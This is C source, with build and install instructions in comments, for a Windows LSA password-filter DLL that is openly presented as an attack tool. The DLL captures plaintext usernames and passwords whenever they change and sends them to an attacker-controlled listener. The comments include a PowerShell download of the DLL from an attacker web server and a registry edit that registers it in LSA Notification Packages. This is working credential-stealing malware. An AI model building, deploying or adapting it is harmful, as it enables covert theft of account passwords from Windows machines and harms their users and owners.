// iDigitalFlame 2019
// Windows Password Filter
// Captures Raw plaintext passwords when changed.
// C DLL for yall scrubs.
//
// Compile:
//  env GOOS=windows CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -v -x -buildmode=c-archive filter.go
//  x86_64-w64-mingw32-gcc -c -o "filter.o" filter.c -fPIC -pthread -lwinmm -lntdll -lws2_32 -DSERVER='"<yourlistenip>:<listenport>"'
//  x86_64-w64-mingw32-gcc -o filter.dll -s -shared filter.o filter.a -fPIC -pthread -lwinmm -lntdll -lws2_32 -DSERVER='"<yourlistenip>:<listenport>"'
//  rm -f filter.o
//  rm -f filter.h
//  rm -f filter.a
//
// Install With
//  powershell -com "$a=New-Object System.Net.WebClient; $a.DownloadFile('http://<webserver>/filter.dll', 'C:\Windows\system32\idk.dll');"
//  powershell -con "$b=(Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'Notification Packages').'Notification Packages'; Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'Notification Packages' -Value ""$b`r`nidk"""
//  Reboot the box
//  ??
//  Profit!
//

#define _WIN32_WINNT 0x0501

#include "filter.h"
#include <windows.h>
#include <ntsecapi.h>

CRITICAL_SECTION cs;

void _() {
    HaGotEm(NULL, 0, NULL, 0, NULL);
}
__declspec(dllexport) BOOL NTAPI InitializeChangeNotify(void) { return TRUE; }

BOOL WINAPI DllMain(HINSTANCE hiDLL, DWORD dwReason, LPVOID lpReserved) { return TRUE; }

__declspec(dllexport) NTSTATUS NTAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
    EnterCriticalSection(&cs);
    HaGotEm(SERVER, UserName->Length, (char*)(UserName->Buffer), NewPassword->Length, (char*)(NewPassword->Buffer));
    LeaveCriticalSection(&cs);
    return 0;
}
__declspec(dllexport) BOOL NTAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOL SetOperation) {
    HaGotEm(SERVER, AccountName->Length, (char*)(AccountName->Buffer), Password->Length, (char*)(Password->Buffer));
    return TRUE;
}
